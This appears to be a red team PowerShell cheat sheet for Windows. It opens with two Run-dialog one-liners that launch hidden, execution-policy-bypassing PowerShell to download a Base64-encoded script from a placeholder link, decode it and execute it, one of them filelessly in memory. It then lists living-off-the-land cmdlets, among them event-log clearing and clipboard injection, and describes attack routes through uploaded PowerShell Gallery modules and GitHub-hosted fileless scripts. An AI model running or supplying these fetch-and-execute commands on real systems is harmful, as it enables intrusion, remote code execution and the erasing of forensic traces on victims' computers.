# Red Team PowerShell

## Execute fileless Base64 encoded script from Run Dialog:

```powershell
powershell -NoP -W H -Ep Bypass &([scriptblock]::Create([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((irm LINK)))))
```

## Download and execute Base64 encoded script from Run Dialog:

```powershell
powershell -NoP -W H -Ep Bypass irm LINK -O $env:USERPROFILE\e.txt;certutil -f -decode $env:USERPROFILE\e.txt $env:USERPROFILE\d.ps1;iex $env:USERPROFILE\d.ps1
```

------------------------------

# Living of the Land Cmdlets:

| Cmdlet                  | Description                                                                                          |
|-------------------------|------------------------------------------------------------------------------------------------------|
| Get-StartApps           | Used to retrieve a list of Start menu apps and tiles for the current user on a Windows operating system. |
| Set-Clipboard           | Used to set clipboard content. Essentially clipboard injection.                                       |
| Get-Clipboard           | Retrieve clipboard content.                                                                          |
| Get-LocalUser           | Return all local users on the system.                                                                |
| Get-NetFirewallProfile  | Gets properties for a firewall profile.                                                              |
| Get-NetFirewallRule     | Gets properties for a firewall rule.                                                                 |
| Get-ComputerInfo        | Retrieves all system and operating system properties from the computer                               |
| Get-Service             | Retrieves a list of all services on the computer                                                     |
| Get-EventLog            | Retrieves events and event logs from local and remote computers (only available in Windows PowerShell 5.1) |
| Get-Process             | Retrieves a list of all active processes on a local or remote computer                               |
| Clear-EventLog          | Deletes all of the entries from the specified event logs on the local computer or on remote computers |
| Clear-RecycleBin        | Deletes the content of a computer's recycle bin                                                       |

# Attack Vectors:

### PowerShell Gallery Modules

- Upload PowerShell Gallery module and import it onto targets systems. This method allows widge range use as most Windows computers has PowerShell enabled. This method also exploits trusted Windows applications, making it harder to detect. This method could also potentially assist in elevated privileges. However, when a module is imported from PowerShell Gallery, it touches the hard drive and is typically saved to `"C:\Users\USER\Documents\PowerShell\Modules\"`.

### Fileless PowerShell Script Execution

- You can upload a file to a remote server and fetch the raw contents of the script and save it as a PowerShell variable and then execute that variable. This allows the execution of PowerShell scripts without the script ever touching the hard drive. The script is saved as a variable, which is only stored in memory for that current session. Using GitHub to host the PowerShell script is a common tactic.

### Decode Base64 using PowerShell

- You can decode Base64 directly in PowerShell. Using `Convert.FromBase64String()` you can decode the content from Base64 to binary. You would then use `[Text.Encoding]::UTF8.GetString()` to convert the binary data to a regular string.

For example:

```powershell
# convert base64 string to binary
$binary = [System.Convert]::FromBase64String("aGVsbG8=")

# convert binary data to string
$string = [System.Text.Encoding]::UTF8.GetString($binary)

# print the string
$string
```


